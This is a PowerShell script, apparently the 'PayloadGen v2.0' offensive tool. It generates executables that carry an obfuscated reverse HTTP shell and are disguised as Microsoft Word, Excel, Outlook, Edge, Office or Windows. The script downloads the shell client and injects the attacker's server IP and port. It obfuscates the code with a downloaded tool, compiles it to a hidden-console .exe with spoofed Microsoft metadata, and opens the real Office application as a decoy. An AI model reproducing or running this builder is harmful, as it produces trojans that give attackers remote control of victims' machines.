[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
$ProgressPreference = "SilentlyContinue" ; $ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform ; if (!$OSVersion -like 'Unix') { $Host.UI.RawUI.BackgroundColor = 'Black' }
Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "PayloadGen v2.0 - by @JoelGMSec"

function Show-Banner { Clear-Host
    Write-Host
    Write-Host "  ____             _                 _  ____             " -ForegroundColor Blue    
    Write-Host " |  _ \ __ _ _   _| | ___   __ _  __| |/ ___| ___ _ __   " -ForegroundColor Blue    
    Write-Host " | |_) / _' | | | | |/ _ \ / _' |/ _' | |  _ / _ \ '_ \  " -ForegroundColor Blue    
    Write-Host " |  __/ (_| | |_| | | (_) | (_| | (_| | |_| |  __/ | | | " -ForegroundColor Blue    
    Write-Host " |_|   \__,_|\__, |_|\___/ \__,_|\__,_|\____|\___|_| |_| " -ForegroundColor Blue    
    Write-Host "             |___/                                       " -ForegroundColor Blue    
    Write-Host "  ------------------- by @JoelGMSec -------------------  " -ForegroundColor Green
    Write-Host }

function Show-Menu {
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Word" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Excel" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Outlook" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Edge" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Office" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Windows" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Custom template" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Show help" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
    Write-Host }

function Show-Help {
    Write-Host "`nThis script allows you to create an .exe file with the payload necessary to use" -ForegroundColor Gray
    Write-Host "HTTP-Shell, you just need to follow the instructions on the screen to generate it." -ForegroundColor Gray
    Write-Host "There are 6 predefined templates and a custom one, with binary info that you like.`n" -ForegroundColor Gray
    Write-Host "For more information, see the readme file on the GitHub page:" -ForegroundColor Gray 
    Write-Host "https://github.com/JoelGMSec/HTTP-Shell - https://darkbyte.net" -ForegroundColor Blue
    Write-Host ; pause }

function Kill-Program {
    $Host.UI.RawUI.ForegroundColor = 'White'
    Write-Host ; Write-Host "[!] Deleting temporary files.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
    Remove-Item $ScriptPath -Force ; Remove-Item $InvokeStealthPath -Force ; Remove-Item $PS2exePath -Force ; Remove-Item $IconPath -Force
    Write-Host ; Write-Host "[!] Exiting!" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2000 ; exit }

# Main function
function Create-Payload {
    do { Show-Banner ; Show-Menu

        $Question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
        $Host.UI.RawUI.ForegroundColor = 'Gray' ; & $Question
        $Random = New-Object System.Random ; "Choose one template:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {

        '1' { $template = 'Word' }
        '2' { $template = 'Excel' }
        '3' { $template = 'Outlook' }
        '4' { $template = 'Edge' }
        '5' { $template = 'Office' }
        '6' { $template = 'Windows' }
        '7' { $template = 'Custom' }
        'H' { Show-Help }
        'X' { Kill-Program }

        default { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}

    until ($input -in '1','2','3','4','5','6','7','X')

# Template data
if($template -in 'Word') { $AppName = "WINWORD" ; $Title = "Microsoft Word" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $b64ico = "$wordico" }
if($template -in 'Excel') { $AppName = "EXCEL" ; $Title = "Microsoft Excel" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $b64ico = "$excelico" }
if($template -in 'Outlook') { $AppName = "OUTLOOK" ; $Title = "Microsoft Outlook" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $b64ico = "$outlookico" }
if($template -in 'Edge') { $AppName = "msedge" ; $Title = "Microsoft Edge" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Edge" ; $Version = "83.0.478.58" ; $b64ico = "$edgeico" }
if($template -in 'Office') { $AppName = "office" ; $Title = "Microsoft Office" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $b64ico = "$officeico" }
if($template -in 'Windows') { $AppName = "windows" ; $Title = "Microsoft Windows" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Windows" ; $Version = "10.0.0.0" ; $b64ico = "$windowsico" }

# Custom template
if($template -in 'Custom') { 
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the name of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomName = $Host.UI.ReadLine() ; if(!$CustomName){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    $Random = New-Object System.Random ; "Enter the name of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomName)
    
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the title of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomTitle = $Host.UI.ReadLine() ; if(!$CustomTitle){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    $Random = New-Object System.Random ; "Enter the title of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomTitle)

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomCompany = $Host.UI.ReadLine() ; if(!$CustomCompany){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomCompany)

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the product of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomProduct = $Host.UI.ReadLine() ; if(!$CustomProduct){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    $Random = New-Object System.Random ; "Enter the product of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomProduct)

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the version of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomVersion = $Host.UI.ReadLine() ; if(!$CustomVersion){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    $Random = New-Object System.Random ; "Enter the version of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomVersion)

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
    $Random = New-Object System.Random ; "Enter the full path of the icon file:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomIcon = $Host.UI.ReadLine() ; if(!$CustomIcon){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
    $Random = New-Object System.Random ; "Enter the full path of the icon file:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomIcon)

    $AppName = "$CustomName" ; $Title = "$CustomTitle" ; $Company = "$CustomCompany" ; $Product = "$CustomProduct" ; $Version = "$CustomVersion" ; $Icon = "$CustomIcon" }

# System & Other variables
    if ($OSVersion -like 'Unix') { 
        $ScriptPath = "./HTTP-Client.ps1"
        $InvokeStealthPath = "./Invoke-Stealth.ps1"
        $PS2exePath = "./ps2exe.ps1"
        $OutfilePath = "./$AppName.exe"
        $IconPath = "./$AppName.ico"
        $ip = hostname -I | awk '{print $1}' }

    else { 
        $ScriptPath = "$env:temp\HTTP-Client.ps1"
        $InvokeStealthPath = "$env:temp\Invoke-Stealth.ps1"
        $PS2exePath = "$env:temp\ps2exe.ps1"
        $OutfilePath = "$pwd\$AppName.exe"
        $IconPath = "$env:temp\$AppName.ico"
        $ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1 }

# IP to connect
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
$Random = New-Object System.Random ; "Enter the IP of your server:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $readip = $Host.UI.ReadLine() ; if($readip) { $ip = $readip }
if(!$readip) { [Console]::SetCursorPosition(0,"$cursortop") ; & $Question ; Write-Host "Enter the IP of your server:` " -ForegroundColor Gray -NoNewLine ; Write-Host $ip -ForegroundColor Green }

# Listening port
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
$Random = New-Object System.Random ; "Now, the listening port:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $port = $Host.UI.ReadLine() ; if(!$port) { [Console]::SetCursorPosition(0,"$cursortop")
& $Question ; Write-Host "Now, the listening port:` " -ForegroundColor Gray -NoNewLine ; Write-Host "80" -ForegroundColor Green ; [string]$port = "80" }

# Enable Sleep
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
$Random = New-Object System.Random ; "Enter sleep time in seconds [0-600]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $sleepon = $Host.UI.ReadLine() ; if(!$sleepon) { [Console]::SetCursorPosition(0,"$cursortop")
& $Question ; Write-Host "Enter sleep time in seconds [0-600]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "10" -ForegroundColor Green ; [string]$sleepon = "10" }

# Download HTTP-Client.ps1 & add content
Write-Host ; Write-Host "[+] Downloading last version of HTTP-Shell.. " -ForegroundColor Blue -NoNewLine
(Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.ps1").content > $ScriptPath
Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000

# Open legitimate Office Application
if($AppName -in 'msedge') { $a = Get-Content $ScriptPath ; $b = "start microsoft-edge: `n" ; Set-Content $ScriptPath -value $b, $a }
if($AppName -in 'WINWORD','EXCEL','OUTLOOK') { 

  $ScriptA = { 
    $regkey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths'
    $appPaths = Get-ChildItem $regkey | Get-ItemProperty | ? { $_.'(default)' } | select -Expand '(default)' | Split-Path -Parent | % { [Environment]::ExpandEnvironmentVariables($_.TrimStart('"')) } | select -Unique
    $env:PATH += ';' + ($appPaths -join ';') ; $Office = $appPaths | findstr /i office | Select -First 1 }

  $ScriptB = "if(`$Office){ Start-Process `"`$Office\$AppName`" 2>&1> `$null }"
  $Content = Get-Content $ScriptPath ; Set-Content $ScriptPath -value $ScriptA`n, $ScriptB`n, $Content }

# Add config to script
$ScriptA = "function HTTP-Client {"
$ScriptB = "} HTTP-Client -c $ip`:$port -s $sleepon"
$Content = Get-Content $ScriptPath ; Set-Content $ScriptPath -value $ScriptA`n, $Content, $ScriptB`n

# Download Invoke-Stealth & Obfuscate Code
Write-Host ; Write-Host "[+] Downloading last version of Invoke-Stealth.. " -ForegroundColor Blue -NoNewLine
Invoke-WebRequest -UseBasicParsing https://darkbyte.net/invoke-stealth.php -outfile $InvokeStealthPath
Write-Host "[OK]`n" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
& $InvokeStealthPath $ScriptPath -technique reverseb64,psobfuscation -nobanner

# Download PS2exe & Compile EXE file
(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$PS2exePath")
if ($OSVersion -like 'Unix') { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -AsByteStream } else { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte }
if ($OSVersion -like 'Unix') { (Get-Content $PS2exePath).Replace("powershell","pwsh") | Set-Content $PS2exePath ; (Get-Content $PS2exePath).Replace("PowerShell","pwsh") | Set-Content $PS2exePath }

if ($OSVersion -like 'Unix') { $response = Invoke-WebRequest -UseBasicParsing "https://ps2exe.azurewebsites.net/"
$viewStateMatch = [regex]::Match($response.Content, '(?<=__VIEWSTATE" value=")(.*?)(?=")')
$eventValidationMatch = [regex]::Match($response.Content, '(?<=__EVENTVALIDATION" value=")(.*?)(?=")')
$viewState = [System.Uri]::EscapeDataString("$viewStateMatch")
$eventValidation = [System.Uri]::EscapeDataString("$eventValidationMatch")

$ScriptFile = Get-Content $ScriptPath
$Script2Send = [System.Uri]::EscapeDataString("$ScriptFile")
$body = [System.String]::new("__EVENTTARGET=ctl00%24ContentPlaceHolder1%24bt_Compile&__VIEWSTATE=$viewState&__EVENTVALIDATION=$eventValidation&ctl00%24ContentPlaceHolder1%24tb_PSSCript=$Script2Send&ctl00%24ContentPlaceHolder1%24tb_Filename=Payload.exe")
Write-Host "[+] Uploading to PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
$postfile = Invoke-WebRequest -Method POST -Uri "https://ps2exe.azurewebsites.net" -Body $body -OutFile "$OutfilePath" -PassThru }

else { Write-Host "[+] Downloading PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noOutput -noVisualStyles -noConsole -noError 2>&1> $null }
Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000

# Repeat operation
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
$Random = New-Object System.Random ; "Do you want to create another one? [y/n]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $repeat = $Host.UI.ReadLine() ; if(!$repeat){ [Console]::SetCursorPosition(0,"$cursortop")
& $Question ; Write-Host "Do you want to create another one? [y/n]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "no " -ForegroundColor Red }

if($repeat -like 'y') { Create-Payload } else { Kill-Program }}

# Base64 icon files
$edgeico=""
$excelico=""
$officeico=""
$outlookico=""
$windowsico=""
$wordico=""

# Execute code
Create-Payload
